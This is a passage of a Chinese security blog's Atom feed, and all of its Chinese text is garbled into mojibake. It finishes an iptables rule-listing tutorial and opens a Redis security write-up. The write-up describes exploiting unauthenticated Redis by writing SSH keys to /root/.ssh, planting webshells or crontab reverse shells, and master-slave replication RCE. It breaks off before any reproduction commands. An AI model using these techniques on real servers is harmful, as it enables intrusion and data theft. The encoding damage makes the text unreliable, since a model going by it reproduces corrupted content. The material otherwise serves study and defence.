å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢"></a>iptables å®é™…æ“ä½œä¹‹è§„åˆ™æŸ¥è¯¢</h1><p>iptablesä¸ºæˆ‘ä»¬é¢„å®šä¹‰äº†4å¼ è¡¨ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯rawè¡¨ã€mangleè¡¨ã€natè¡¨ã€filterè¡¨ï¼Œä¸åŒçš„è¡¨æ‹¥æœ‰ä¸åŒçš„åŠŸèƒ½ã€‚</p><p>filterè´Ÿè´£è¿‡æ»¤åŠŸèƒ½ï¼Œæ¯”å¦‚å…è®¸å“ªäº›IPåœ°å€è®¿é—®ï¼Œæ‹’ç»å“ªäº›IPåœ°å€è®¿é—®ï¼Œå…è®¸è®¿é—®å“ªäº›ç«¯å£ï¼Œç¦æ­¢è®¿é—®å“ªäº›ç«¯å£ï¼Œfilterè¡¨ä¼šæ ¹æ®æˆ‘ä»¬å®šä¹‰çš„è§„åˆ™è¿›è¡Œè¿‡æ»¤ï¼Œfilterè¡¨åº”è¯¥æ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨åˆ°çš„è¡¨äº†ï¼Œæ‰€ä»¥æ­¤å¤„ï¼Œæˆ‘ä»¬ä»¥filterè¡¨ä¸ºä¾‹ï¼Œå¼€å§‹å­¦ä¹ æ€æ ·å®é™…æ“ä½œiptablesã€‚</p><ul><li>æŸ¥çœ‹filter è¡¨ä¸­çš„è§„åˆ™</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -L</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨-té€‰é¡¹ï¼ŒæŒ‡å®šè¦æ“ä½œçš„è¡¨ï¼Œä½¿ç”¨-Lé€‰é¡¹ï¼ŒæŸ¥çœ‹-té€‰é¡¹å¯¹åº”çš„è¡¨çš„è§„åˆ™ï¼Œ-Lé€‰é¡¹çš„æ„æ€æ˜¯ï¼Œåˆ—å‡ºè§„åˆ™ï¼Œæ‰€ä»¥ï¼Œä¸Šè¿°å‘½ä»¤çš„å«ä¹‰ä¸ºåˆ—å‡ºfilterè¡¨çš„æ‰€æœ‰è§„åˆ™</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826222419.png" alt="image-20200826222325023"></p><p>ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹å‡ºï¼ŒINPUTé“¾ã€FORWARDé“¾ã€OUTPUTé“¾éƒ½æ‹¥æœ‰â€è¿‡æ»¤â€çš„èƒ½åŠ›ï¼Œæ‰€ä»¥ï¼Œå½“æˆ‘ä»¬è¦å®šä¹‰æŸæ¡â€è¿‡æ»¤â€çš„è§„åˆ™æ—¶ï¼Œæˆ‘ä»¬ä¼šåœ¨filterè¡¨ä¸­å®šä¹‰ï¼Œä½†æ˜¯å…·ä½“åœ¨å“ªæ¡â€é“¾â€ä¸Šå®šä¹‰è§„åˆ™å‘¢ï¼Ÿè¿™å–å†³äºæˆ‘ä»¬çš„å·¥ä½œåœºæ™¯ã€‚æ¯”å¦‚ï¼Œ<strong>æˆ‘ä»¬éœ€è¦ç¦æ­¢æŸä¸ªIPåœ°å€è®¿é—®æˆ‘ä»¬çš„ä¸»æœºï¼Œæˆ‘ä»¬åˆ™éœ€è¦åœ¨INPUTé“¾ä¸Šå®šä¹‰è§„åˆ™ã€‚å› ä¸ºï¼Œæˆ‘ä»¬åœ¨ç†è®ºæ€»ç»“ä¸­å·²ç»æåˆ°è¿‡ï¼ŒæŠ¥æ–‡å‘å¾€æœ¬æœºæ—¶ï¼Œä¼šç»è¿‡PREROUTINGé“¾ä¸INPUTé“¾ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ç¦æ­¢æŸäº›æŠ¥æ–‡å‘å¾€æœ¬æœºï¼Œæˆ‘ä»¬åªèƒ½åœ¨PREROUTINGé“¾å’ŒINPUTé“¾ä¸­å®šä¹‰è§„åˆ™ï¼Œä½†æ˜¯PREROUTINGé“¾å¹¶ä¸å­˜åœ¨äºfilterè¡¨ä¸­ï¼Œæ¢å¥è¯è¯´å°±æ˜¯ï¼ŒPREROUTINGå…³å¡å¤©ç”Ÿå°±æ²¡æœ‰è¿‡æ»¤çš„èƒ½åŠ›ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åªèƒ½åœ¨INPUTé“¾ä¸­å®šä¹‰</strong>ï¼Œå½“ç„¶ï¼Œå¦‚æœæ˜¯å…¶ä»–å·¥ä½œåœºæ™¯ï¼Œå¯èƒ½éœ€è¦åœ¨FORWARDé“¾æˆ–è€…OUTPUTé“¾ä¸­å®šä¹‰è¿‡æ»¤è§„åˆ™ã€‚</p><p>æŸ¥è¯¢å…¶ä»–è¡¨ä¸­çš„è§„åˆ™ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iptables -t raw -L</span><br><span class="line"></span><br><span class="line">iptables -t mangle -L</span><br><span class="line"></span><br><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœç•¥-t filterï¼Œå½“æ²¡æœ‰ä½¿ç”¨-té€‰é¡¹æŒ‡å®šè¡¨æ—¶ï¼Œé»˜è®¤ä¸ºæ“ä½œfilterè¡¨ï¼Œå³iptables -Lè¡¨ç¤ºåˆ—å‡ºfilterè¡¨ä¸­çš„æ‰€æœ‰è§„åˆ™ã€‚</p><ul><li>æŸ¥è¯¢æŒ‡å®šè¡¨ä¸­æŒ‡å®šé“¾çš„è§„åˆ™</li></ul><p>å› ä¸ºæˆ‘çš„vps æ²¡æœ‰é…ç½®iptablesï¼Œæ‰€ä»¥å›¾ç‰‡å°±ç›´æ¥æŠ„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -L INPUT(æ³¨æ„å¤§å°å†™)</span><br><span class="line">æŸ¥è¯¢æ›´è¯¦ç»†çš„æ•°æ®å¯ä»¥ä½¿ç”¨-v é€‰é¡¹</span><br><span class="line">iptables -vL INPUT</span><br></pre></td></tr></table></figure><p><code>pkts bytes target     prot opt in     out     source               destination        </code></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_3.png"></p><p><strong>pkts</strong>:å¯¹åº”è§„åˆ™åŒ¹é…åˆ°çš„æŠ¥æ–‡çš„ä¸ªæ•°ã€‚</p><p><strong>bytes</strong>:å¯¹åº”åŒ¹é…åˆ°çš„æŠ¥æ–‡åŒ…çš„å¤§å°æ€»å’Œã€‚</p><p><strong>target</strong>:è§„åˆ™å¯¹åº”çš„targetï¼Œå¾€å¾€è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„â€åŠ¨ä½œâ€ï¼Œå³è§„åˆ™åŒ¹é…æˆåŠŸåéœ€è¦é‡‡å–çš„æªæ–½ã€‚</p><p><strong>prot</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„åè®®ï¼Œæ˜¯å¦åªé’ˆå¯¹æŸäº›åè®®åº”ç”¨æ­¤è§„åˆ™ã€‚</p><p><strong>opt</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„é€‰é¡¹ã€‚</p><p><strong>in</strong>:è¡¨ç¤ºæ•°æ®åŒ…ç”±å“ªä¸ªæ¥å£(ç½‘å¡)æµå…¥ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®é€šè¿‡å“ªå—ç½‘å¡æµå…¥çš„æŠ¥æ–‡éœ€è¦åŒ¹é…å½“å‰è§„åˆ™ã€‚</p><p><strong>out</strong>:è¡¨ç¤ºæ•°æ®åŒ…ç”±å“ªä¸ªæ¥å£(ç½‘å¡)æµå‡ºï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®é€šè¿‡å“ªå—ç½‘å¡æµå‡ºçš„æŠ¥æ–‡éœ€è¦åŒ¹é…å½“å‰è§„åˆ™ã€‚</p><p><strong>source</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„æºå¤´åœ°å€ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç½‘æ®µã€‚</p><p><strong>destination</strong>:è¡¨ç¤ºè§„åˆ™å¯¹åº”çš„ç›®æ ‡åœ°å€ã€‚å¯ä»¥æ˜¯ä¸€ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªç½‘æ®µã€‚</p><p>ä¸Šå›¾ä¸­çš„æºåœ°å€ä¸ç›®æ ‡åœ°å€éƒ½ä¸ºanywhereï¼Œçœ‹æ¥ï¼Œiptablesé»˜è®¤ä¸ºæˆ‘ä»¬è¿›è¡Œäº†åç§°è§£æï¼Œä½†æ˜¯åœ¨è§„åˆ™éå¸¸å¤šçš„æƒ…å†µä¸‹å¦‚æœè¿›è¡Œåç§°è§£æï¼Œæ•ˆç‡ä¼šæ¯”è¾ƒä½ï¼Œæ‰€ä»¥ï¼Œåœ¨æ²¡æœ‰æ­¤éœ€æ±‚çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥<strong>ä½¿ç”¨-né€‰é¡¹ï¼Œè¡¨ç¤ºä¸å¯¹IPåœ°å€è¿›è¡Œåç§°åè§£ï¼Œç›´æ¥æ˜¾ç¤ºIPåœ°å€</strong>ï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -nvL</span><br></pre></td></tr></table></figure><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_4.png"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè§„åˆ™ä¸­çš„æºåœ°å€ä¸ç›®æ ‡åœ°å€å·²ç»æ˜¾ç¤ºä¸ºIPï¼Œè€Œéè½¬æ¢åçš„åç§°ã€‚</p><p>ä½¿ç”¨<code>--line-numbers</code> å³å¯æ˜¾ç¤ºè§„åˆ™çš„ç¼–å·</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826224157.png" alt="image-20200826224155655"></p><p>å¦‚å›¾ï¼Œæ¯ä¸ªé“¾çš„åé¢éƒ½æœ‰ä¸€ä¸ªæ‹¬å·ï¼Œæ‹¬å·åé¢æœ‰ä¸€äº›ä¿¡æ¯ï¼š</p><p><strong>policy</strong>è¡¨ç¤ºå½“å‰é“¾çš„é»˜è®¤ç­–ç•¥ï¼Œpolicy ACCEPTè¡¨ç¤ºä¸Šå›¾ä¸­INPUTçš„é“¾çš„é»˜è®¤åŠ¨ä½œä¸ºACCEPT</p><p><strong>packets</strong>è¡¨ç¤ºå½“å‰é“¾ï¼ˆä¸Šä¾‹ä¸ºINPUTé“¾ï¼‰é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„åŒ…çš„æ•°é‡ï¼Œ0 packetsè¡¨ç¤ºé»˜è®¤ç­–ç•¥åŒ¹é…åˆ°0ä¸ªåŒ…ã€‚</p><p><strong>bytes</strong>è¡¨ç¤ºå½“å‰é“¾é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„æ‰€æœ‰åŒ…çš„å¤§å°æ€»å’Œã€‚</p><p>å…¶å®ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠpacketsä¸bytesç§°ä½œâ€è®¡æ•°å™¨â€ï¼Œä¸Šå›¾ä¸­çš„è®¡æ•°å™¨è®°å½•äº†é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„æŠ¥æ–‡æ•°é‡ä¸æ€»å¤§å°ï¼Œâ€è®¡æ•°å™¨â€åªä¼šåœ¨ä½¿ç”¨-vé€‰é¡¹æ—¶ï¼Œæ‰ä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚</p><p>å¦‚æœè¦æŸ¥çœ‹æ›´ç²¾ç¡®çš„è®¡æ•°å€¼ï¼Œå¯ä»¥ä½¿ç”¨<code>-x</code>é€‰é¡¹ã€‚</p><h1 id="Iptables-è§„åˆ™ç®¡ç†"><a href="#Iptables-è§„åˆ™ç®¡ç†" class="headerlink" title="Iptables è§„åˆ™ç®¡ç†"></a>Iptables è§„åˆ™ç®¡ç†</h1><p><a href="http://www.zsythink.net/archives/1517">http://www.zsythink.net/archives/1517</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š &lt;/p&gt;
&lt;p&gt;(å†…å®¹å’Œå›¾ç‰‡)&lt;/p&gt;
&lt;p&gt;å…¨æ•™ç¨‹ç³»åˆ—&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.zsythink.net/archives/tag/iptables/&quot;&gt;iptables å…¥é—¨ç³»åˆ—&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="è¿ç»´çŸ¥è¯†" scheme="https://hack-for.fun/categories/%E8%BF%90%E7%BB%B4%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="iptables" scheme="https://hack-for.fun/tags/iptables/"/>
    
  </entry>
  
  <entry>
    <title>Redis å®‰å…¨å­¦ä¹ ç¬”è®°</title>
    <link href="https://hack-for.fun/c10c5ca9.html"/>
    <id>https://hack-for.fun/c10c5ca9.html</id>
    <published>2020-08-26T01:58:53.000Z</published>
    <updated>2020-08-26T02:09:53.598Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘æ”¾å‡ºæ¥çš„æ–‡ç« éƒ½æ˜¯ä»¥å‰æ—©å°±æ€»ç»“å¥½çš„äº†ã€‚</p><h1 id="Redis-å®‰å…¨å­¦ä¹ ç¬”è®°"><a href="#Redis-å®‰å…¨å­¦ä¹ ç¬”è®°" class="headerlink" title="Redis å®‰å…¨å­¦ä¹ ç¬”è®°"></a>Redis å®‰å…¨å­¦ä¹ ç¬”è®°</h1><p><a href="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ"><img src="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ/badge" alt="hackmd-github-sync-badge"></a></p><p>[TOC]</p><p>å®æˆ˜ç¯å¢ƒä¸‹ï¼Œæ„Ÿè§‰Redis æœªæˆæƒéå¸¸å¸¸è§ï¼Œè€Œæˆ‘ä¹‹å‰åªçŸ¥é“æ€ä¹ˆåˆ©ç”¨åˆ«äººçš„å†™å¥½çš„å·¥å…·å»è§£CTFï¼Œæ²¡æœ‰å»ç ”ç©¶è¿‡åŸç†ï¼Œé‚åœ¨ç«¯åˆèŠ‚æ¥ç ”ç©¶ä¸€æ³¢ï¼</p><h2 id="Redis-ä»‹ç»"><a href="#Redis-ä»‹ç»" class="headerlink" title="Redis ä»‹ç»"></a>Redis ä»‹ç»</h2><p>Redisæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€ Key-Valueæ•°æ®åº“ã€‚å’ŒMemcachedç±»ä¼¼ï¼Œå®ƒæ”¯æŒå­˜å‚¨çš„value ç±»å‹ç›¸å¯¹æ›´å¤šï¼ŒåŒ…æ‹¬ string(å­—ç¬¦ä¸²)ã€list ( é“¾è¡¨)ã€ set(é›†åˆ)ã€zset(sorted set â€“ æœ‰åºé›†åˆ)å’Œ hashï¼ˆå“ˆå¸Œç±»å‹ï¼‰ã€‚è¿™äº›æ•°æ®ç±»å‹éƒ½æ”¯æŒpush/pop ã€ add/remove åŠå–äº¤é›†å¹¶é›†å’Œå·®é›†åŠæ›´ä¸°å¯Œçš„æ“ä½œï¼Œè€Œä¸”è¿™äº›æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œ redisæ”¯æŒå„ç§ä¸åŒæ–¹å¼çš„æ’åºã€‚ä¸ memcached ä¸€æ ·ï¼Œä¸ºäº†ä¿è¯æ•ˆç‡ï¼Œæ•°æ®éƒ½æ˜¯ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚åŒºåˆ«çš„æ˜¯ redis ä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº† master-slave ( ä¸»ä»)åŒæ­¥ã€‚</p><blockquote><p>Redis ä¸‹è½½åœ°å€ï¼š<a href="http://download.redis.io/releases/">http://download.redis.io/releases/</a></p></blockquote><h2 id="RESP-åè®®ä»‹ç»"><a href="#RESP-åè®®ä»‹ç»" class="headerlink" title="RESP åè®®ä»‹ç»"></a>RESP åè®®ä»‹ç»</h2><p>RedisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šè¿‡RESPï¼ˆREdis Serialization Protocolï¼‰åè®®é€šä¿¡ã€‚<br>RESPåè®®æ˜¯åœ¨Redis 1.2ä¸­å¼•å…¥çš„ï¼Œä½†å®ƒæˆä¸ºäº†ä¸Redis 2.0ä¸­çš„RedisæœåŠ¡å™¨é€šä¿¡çš„æ ‡å‡†æ–¹å¼ã€‚è¿™æ˜¯æ‚¨åº”è¯¥åœ¨Rediså®¢æˆ·ç«¯ä¸­å®ç°çš„åè®®ã€‚<br>RESPå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ”¯æŒä»¥ä¸‹æ•°æ®ç±»å‹çš„åºåˆ—åŒ–åè®®ï¼šç®€å•å­—ç¬¦ä¸²ï¼Œé”™è¯¯ï¼Œæ•´æ•°ï¼Œæ‰¹é‡å­—ç¬¦ä¸²å’Œæ•°ç»„ã€‚</p><p>RESPåœ¨Redisä¸­ç”¨ä½œè¯·æ±‚ - å“åº”åè®®çš„æ–¹å¼å¦‚ä¸‹ï¼š</p><p>å®¢æˆ·ç«¯å°†å‘½ä»¤ä½œä¸ºBulk Stringsçš„RESPæ•°ç»„å‘é€åˆ°RedisæœåŠ¡å™¨ã€‚<br>æœåŠ¡å™¨æ ¹æ®å‘½ä»¤å®ç°å›å¤ä¸€ç§RESPç±»å‹ã€‚<br>åœ¨RESPä¸­ï¼ŒæŸäº›æ•°æ®çš„ç±»å‹å–å†³äºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼š<br>å¯¹äºSimple Stringsï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯+<br>å¯¹äºerrorï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯-<br>å¯¹äºIntegerï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯:<br>å¯¹äºBulk Stringsï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯$<br>å¯¹äºarrayï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯*<br>æ­¤å¤–ï¼ŒRESPèƒ½å¤Ÿä½¿ç”¨ç¨åæŒ‡å®šçš„Bulk Stringsæˆ–Arrayçš„ç‰¹æ®Šå˜ä½“æ¥è¡¨ç¤ºNullå€¼ã€‚<br>åœ¨RESPä¸­ï¼Œåè®®çš„ä¸åŒéƒ¨åˆ†å§‹ç»ˆä»¥â€\r\nâ€(CRLF)ç»“æŸã€‚</p><p><a href="https://xz.aliyun.com/t/5665#toc-0">https://xz.aliyun.com/t/5665#toc-0</a></p><h2 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h2><h3 id="æœªæˆæƒæ¼æ´"><a href="#æœªæˆæƒæ¼æ´" class="headerlink" title="æœªæˆæƒæ¼æ´"></a>æœªæˆæƒæ¼æ´</h3><p>Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰çš„æƒ…å†µä¸‹ï¼ˆé»˜è®¤é…ç½®ï¼‰ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ /root/.ssh æ–‡ä»¶å¤¹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p>Rediså› é…ç½®ä¸å½“å¯ä»¥å¯¼è‡´æœªæˆæƒè®¿é—®ï¼Œè¢«æ”»å‡»è€…æ¶æ„åˆ©ç”¨ã€‚å½“å‰æµè¡Œçš„é’ˆå¯¹Redisæœªæˆæƒè®¿é—®çš„ä¸€ç§æ–°å‹æ”»å‡»æ–¹å¼ï¼Œåœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼Œå¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨æƒé™è¢«è·å–å’Œæ•°æ®åˆ é™¤ã€æ³„éœ²æˆ–åŠ å¯†å‹’ç´¢äº‹ä»¶å‘ç”Ÿï¼Œä¸¥é‡å±å®³ä¸šåŠ¡æ­£å¸¸æœåŠ¡ã€‚ã€€ã€€éƒ¨åˆ†æœåŠ¡å™¨ä¸Šçš„Redis ç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¹¶ä¸”æ²¡æœ‰å¼€å¯è®¤è¯ï¼ˆè¿™æ˜¯Redis çš„é»˜è®¤é…ç½®ï¼‰ï¼Œä»¥åŠè¯¥ç«¯å£å¯ä»¥é€šè¿‡å…¬ç½‘ç›´æ¥è®¿é—®ï¼Œå¦‚æœæ²¡æœ‰é‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œå°†ä¼šå¯¼è‡´ Redis æœåŠ¡ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¯èƒ½é€ æˆå…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥åœ¨éæˆæƒæƒ…å†µä¸‹ç›´æ¥è®¿é—®RedisæœåŠ¡å¹¶è¿›è¡Œç›¸å…³æ“ä½œã€‚ã€€ã€€ç›®å‰æ¯”è¾ƒä¸»æµçš„æ¡ˆä¾‹ï¼šyam2 minerd æŒ–çŸ¿ç¨‹åºï¼Œè¿˜æœ‰åœ¨å¤šæ¬¡åº”æ€¥äº‹ä»¶ä¸­å‘ç°å¤§é‡çš„watch-smartdæŒ–çŸ¿æœ¨é©¬ã€‚</p><p>ç®€å•è¯´ï¼Œæ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><p>ï¼ˆ1ï¼‰redisç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ï¼›</p><p>ï¼ˆ2ï¼‰æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œå¯ä»¥å…å¯†ç è¿œç¨‹ç™»å½•redisæœåŠ¡ã€‚</p><p>(3) root èº«ä»½è¿è¡Œredis</p><p>ä¸»æµæ¡ˆä¾‹å›¾ç¤º<br>ä¸»æµæ¡ˆä¾‹å›¾ç¤º</p><p>å†™å…¬é’¥åªæ˜¯å…¶ä¸­ä¸€ç§ï¼Œè¿˜å¯ä»¥å†™webshell ï¼Œcrontab åå¼¹shellï¼Œæ¥getshellã€‚<br><img src="https://i.imgur.com/p9JFoqk.png"></p><p>ä»¥åŠå…¶ä»–æ¼æ´åœºæ™¯ï¼Œä¸‹é¢é€ä¸€ä»‹ç»å’Œå¤ç°ã€‚</p><h3 id="ä¸»ä»å¤åˆ¶-RCE"><a href="#ä¸»ä»å¤åˆ¶-RCE" class="headerlink" title="ä¸»ä»å¤åˆ¶ RCE"></a>ä¸»ä»å¤åˆ¶ RCE</h3><p>Redisä¸»ä»å¤åˆ¶ä»‹ç»<br>Redisæ˜¯ä¸€ä¸ªä½¿ç”¨ANSI Cç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä½†å¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ªRedisçš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRediså°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚</p><p>æ¼æ´å‡ºç°çš„èƒŒæ™¯<br>éšç€ç°ä»£çš„æœåŠ¡éƒ¨ç½²æ–¹å¼çš„ä¸æ–­å‘å±•ï¼Œç»„ä»¶åŒ–æˆäº†ä¸å¯é€ƒé¿çš„å¤§è¶‹åŠ¿ï¼Œdockerå°±æ˜¯è¿™è‚¡é£æ½®ä¸‹çš„äº§ç‰©ä¹‹ä¸€ï¼Œè€Œåœ¨è¿™ç§éƒ¨ç½²æ¨¡å¼ä¸‹ï¼Œä¸€ä¸ªå•ä¸€çš„å®¹å™¨ä¸­ä¸ä¼šæœ‰é™¤redisä»¥å¤–çš„ä»»ä½•æœåŠ¡å­˜åœ¨ï¼ŒåŒ…æ‹¬sshå’Œcrontabï¼Œå†åŠ ä¸Šæƒé™çš„ä¸¥æ ¼æ§åˆ¶ï¼Œåªé å†™æ–‡ä»¶å°±å¾ˆéš¾å†getshelläº†ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±éœ€è¦å…¶ä»–çš„åˆ©ç”¨æ‰‹æ®µäº†</p><p>æ¼æ´åŸç†<br>åœ¨ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNCåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šã€‚</p><p>ç„¶ååœ¨ä»æœºä¸ŠåŠ è½½soæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæ‹“å±•çš„æ–°å‘½ä»¤äº†ã€‚</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" 